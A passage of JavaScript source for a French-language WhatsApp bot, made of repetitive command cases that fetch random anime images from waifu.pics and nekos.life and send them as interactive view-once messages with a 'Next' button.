          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animesmug':{
await KevStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smug`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animeblush':{
await KevStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/blush`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animewave':{
await KevStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wave`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animesmile':{
await KevStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smile`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animepoke':{
await KevStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/poke`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animewink':{
await KevStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wink`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animebonk':{
await KevStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bonk`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animebully':{
await KevStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bully`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animeyeet':{
await KevStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/yeet`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animebite':{
await KevStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bite`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animelick':{
await KevStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/lick`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animekill':{
await KevStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/kill`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animecry':{
await KevStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cry`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animewlp':{
await KevStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/wallpaper`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animekiss':{
await KevStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/kiss`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animehug':{
await KevStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/hug`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animeneko':{
await KevStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/neko`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animepat':{
await KevStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/pat`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animeslap':{
await KevStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/slap`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animecuddle':{
await KevStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/cuddle`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animewaifu':{
await KevStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/waifu`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animenom':{
await KevStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/nom`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animefoxgirl':{
await KevStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/fox_girl`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
